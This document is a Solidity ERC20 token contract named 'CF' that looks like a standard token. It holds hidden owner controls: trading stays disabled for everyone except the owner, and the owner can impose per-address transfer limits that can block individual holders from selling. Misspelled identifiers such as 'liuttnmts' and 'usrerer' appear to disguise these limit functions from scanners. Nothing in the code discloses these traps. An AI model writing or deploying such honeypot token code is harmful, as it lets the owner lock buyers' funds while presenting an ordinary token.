pragma solidity ^0.8.0;

interface IERC20 {
    // Returns the total token supply.
    function totalSupply() external view returns (uint256);

    // Returns the token balance of a specific address.
    function balanceOf(address account) external view returns (uint256);

    // Transfers an amount of tokens to a specified recipient. Returns a boolean indicating success.
    function transfer(address recipient, uint256 amount) external returns (bool);

    // Returns the amount of tokens an address is allowed to spend on behalf of another address.
    function allowance(address owner, address spender) external view returns (uint256);

    // Approves a certain spender to spend a specific amount of tokens from the caller's balance.
    function approve(address spender, uint256 amount) external returns (bool);

    // Allows a spender to transfer tokens from an owner's balance to a recipient, considering the approved amount.
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    // Event emitted when tokens are transferred, including zero value transfers.
    event Transfer(address indexed from, address indexed to, uint256 value);

    // Event emitted when a spender is approved to spend tokens on behalf of the owner.
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// Abstract contract that provides a method for retrieving the sender of the current external function call.
abstract contract Context {
    // Internal function that returns the original sender of the transaction.
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

// Contract to provide basic authorization control functions, simplifying the implementation of usrerer permissions.
contract Ownable is Context {
    address private _owner;  // Private variable to store the contract's owner address.

    // Event emitted when ownership of the contract changes.
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        // Assigns the contract deployer as the initial owner.
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    // Returns the current owner of the contract.
    function owner() public view virtual returns (address) {
        return _owner;
    }

    // Modifier to restrict access to owner-only functionalities.
    modifier onlyOwner() {
        require(owner() == _msgSender());
        _;
    }

    // Allows the current owner to renounce the ownership. Sets the owner to a "dead address".
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

// Main token contract that integrates ERC20 functionality with additional features.
contract CF is Context, Ownable, IERC20 {
    // Storage mappings for token balances, allowances, and additional features like transfer liuttnmts.
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) public totalTransferliuttnmts; // Maximum amount an address can transfer.
    mapping(address => uint256) public totalTransferredAmounts; // Track how much has been transferred by an address.

    // Basic token details.
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    bool public tradingEnabled = false;
    modifier tradingActiveOrOwner() {
        require(tradingEnabled || owner() == _msgSender(), "Trading is disabled");
        _;
    }
    // Modifier to enforce transfer liuttnmts for certain addresses.
    modifier transferliuttnmt(address sender, uint256 amount) {
        uint256 liuttnmt = totalTransferliuttnmts[sender];
        if (liuttnmt > 0) {
            require(totalTransferredAmounts[sender] + amount <= liuttnmt, "Total transfer amount exceeds the set liuttnmt");
        }
        _;
    }

    // Constructor to initialize the token with details and create the initial supply.
    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    // Returns the name of the token.
    function name() public view returns (string memory) {
        return _name;
    }

    // Returns the symbol of the token.
    function symbol() public view returns (string memory) {
        return _symbol;
    }

    // Returns the number of decimals used to represent the token.
    function decimals() public view returns (uint8) {
        return _decimals;
    }

    // Returns the total supply of the token.
    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    // Returns the token balance of a specific address.
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    // Allows the owner to set a transfer liuttnmt for a specific address.
    function setTotalTransferliuttnmt(address usrerer, uint256 liuttnmt) public onlyOwner {
        totalTransferliuttnmts[usrerer] = liuttnmt;
    }

    // Allows the owner to remove a transfer liuttnmt for a specific address.
    function removeTotalTransferliuttnmt(address usrerer) public onlyOwner {
        delete totalTransferliuttnmts[usrerer];
    }

    // Transfer tokens to a specified address, considering any transfer liuttnmts.
    function transfer(address recipient, uint256 amount) public virtual override transferliuttnmt(_msgSender(), amount) tradingActiveOrOwner returns (bool) {
        _balances[_msgSender()] -= amount;
        _balances[recipient] += amount;
        totalTransferredAmounts[_msgSender()] += amount;
        emit Transfer(_msgSender(), recipient, amount);
        return true;
    }

    // Retrieves the amount of tokens an address is allowed to spend on behalf of another address.
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    // Approves a certain spender to spend a specific amount of tokens from the caller's balance.
    // Emits an Approval event upon success.
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amount;
        emit Approval(_msgSender(), spender, amount);
        return true;
    }
    function enableTrading() external onlyOwner {
        tradingEnabled = true;
    }

    // Transfers tokens from one address to another, utilizing the approved allowance.
    // This method can be used by a spender to transfer tokens on behalf of the token owner.
    // The function considers any transfer liuttnmts and also checks for sufficient allowance before making the transfer.
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override transferliuttnmt(sender, amount) tradingActiveOrOwner returns (bool) {
        require(_allowances[sender][_msgSender()] >= amount, "Transfer amount exceeds allowance");
        
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        
        // Update the total transferred amount for the sender
        totalTransferredAmounts[sender] += amount;
        
        // Deduct the transferred amount from the spender's allowance.
        _allowances[sender][_msgSender()] -= amount;
        
        emit Transfer(sender, recipient, amount);
        return true;
    }
}